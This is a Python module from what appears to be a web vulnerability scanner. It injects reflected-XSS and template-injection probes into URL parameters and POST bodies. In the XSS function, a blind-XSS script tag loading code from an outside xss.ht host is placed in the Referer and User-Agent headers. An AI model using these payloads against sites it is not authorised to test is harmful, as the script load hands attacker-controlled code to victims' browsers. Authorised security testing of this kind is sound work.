from core.utils import utils
import requests
import re
import concurrent.futures
from multiprocessing import Process
from core.colors import green, white, end, info, bad, good, run

#xss
def xssInAction(reqUrl, reqMethod, reqBody, requestInZap):
	blindXSSPayload = '"><script src=https://amanrawat.xss.ht></script>'
	response, reqBodyReal = "", ""
	xssPayload = "ixsstest\"ixsstest>ixsstest<ixsstest"
	xsstestfinal, remDups = [], []
	partern = "ixsstest(.*?)ixsstest"
	possiblexss = ['"', "'", ">", "<"]

	originalResponse = requestInZap["responseBody"];

	PayloadWithHeaders = {
			'referer' : reqUrl+blindXSSPayload,
			'user-agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'+blindXSSPayload
	}

	if reqBody:
		reqBodyReal = reqBody
		reqBody, key = utils.createPostPayload(reqBody)
		reqBody = utils.updateKeyValues(reqBody, key, xssPayload)
		try:
			response = requests.post(reqUrl, data=reqBody, headers=PayloadWithHeaders, timeout=5, allow_redirects=True).text.lower()
		except:
			pass
	else:
		reqUrl = utils.urlWithParam(reqUrl, xssPayload)
		try:
			response = requests.get(reqUrl, headers=PayloadWithHeaders, timeout=5).text.lower()
		except:
			pass

	res = re.findall(partern, response)
	if res != []:
		for tags in possiblexss:
			if tags in res:
				xsstestfinal.append(tags)
		
		if xsstestfinal != []:
			vulnerableUrl = utils.urlWithParam(reqUrl, "payload")
			print("%s possible xss [%s]: %s"%(good, reqMethod, vulnerableUrl))
			utils.saveFinding(f"possible xss [{reqMethod}]: {vulnerableUrl}")


def sstiInAction(reqUrl, reqMethod, reqBody, requestInZap):
	response = ""
	sstiPayload = "ixsstest{{7*7}}ixsstest{{7*'7'}}ixsstest<%= 7*7 %>ixsstest"
	sstitestfinal, remDups = [], []
	partern = "ixsstest(.*?)ixsstest"
	possiblessti = ["49", "7777777"]

	if reqBody:
		reqBody, key = utils.createPostPayload(reqBody)
		reqBody = utils.updateKeyValues(reqBody, key, sstiPayload)
		try:
			response = requests.post(reqUrl, data=reqBody, timeout=5, allow_redirects=True).text.lower()
		except:
			pass
	else:
		reqUrl = utils.urlWithParam(reqUrl, sstiPayload)
		try:
			response = requests.get(reqUrl, timeout=5).text.lower()
		except:
			pass

	res = re.findall(partern, response)
	if res != []:
		for tags in possiblessti:
			if tags in res:
				sstitestfinal.append(tags)
		
		if sstitestfinal != []:
			vulnerableUrl = utils.urlWithParam(reqUrl, "payload")
			print("%s possible ssti [%s]: %s"%(good, reqMethod, vulnerableUrl))
			utils.saveFinding(f"possible xss [{reqMethod}]: {vulnerableUrl}")

def startScan(reqUrl, reqMethod, reqBody, requestInZap):
	#XSS scanner
	p1 = Process(target=xssInAction, args=(reqUrl, reqMethod, reqBody, requestInZap, ))
	p1.start()

	#SSTI scanner
	p2 = Process(target=sstiInAction, args=(reqUrl, reqMethod, reqBody, requestInZap, ))
	p2.start()

	#join process
	p1.join()
	p2.join()



